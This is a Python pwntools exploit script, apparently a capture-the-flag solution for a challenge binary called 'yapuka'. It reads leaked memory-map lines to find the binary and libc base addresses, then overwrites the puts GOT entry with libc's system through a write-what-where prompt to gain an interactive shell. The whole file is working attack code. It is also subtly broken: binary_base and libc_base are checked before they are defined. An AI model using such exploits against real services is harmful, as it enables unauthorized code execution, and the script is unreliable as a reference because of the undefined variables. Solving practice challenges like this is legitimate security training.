from pwn import *

elf = ELF('./yapuka', checksec=False)
libc = ELF('./libc-2.36.so', checksec=False)
ld = ELF('./ld-2.36.so', checksec=False)

r = remote('localhost', 4000)

leak_data = r.recvuntil(b"Where:").decode()
lines = leak_data.split('\n')

for line in lines:
    if 'yapuka' in line and binary_base == 0:
        binary_base = int(line.split('-')[0], 16)
        elf.address = binary_base
    if 'libc.so.6' in line and libc_base == 0:
        libc_base = int(line.split('-')[0], 16)
        libc.address = libc_base

log.success(f"Binary Base: {hex(elf.address)}")
log.success(f"Libc Base:   {hex(libc.address)}")

puts_got = elf.got['puts']
system_addr = libc.symbols['system']

def send_16(val):
    val_str = str(val).encode()
    if len(val_str) < 15:
        payload = val_str + b'\x00' * (15 - len(val_str)) + b'\n'
    elif len(val_str) == 15:
        payload = val_str + b'\n'
    else:
        payload = val_str[:15] + b'\n'
    r.send(payload)

send_16(puts_got)

r.recvuntil(b"What:")
send_16(system_addr)

r.interactive()
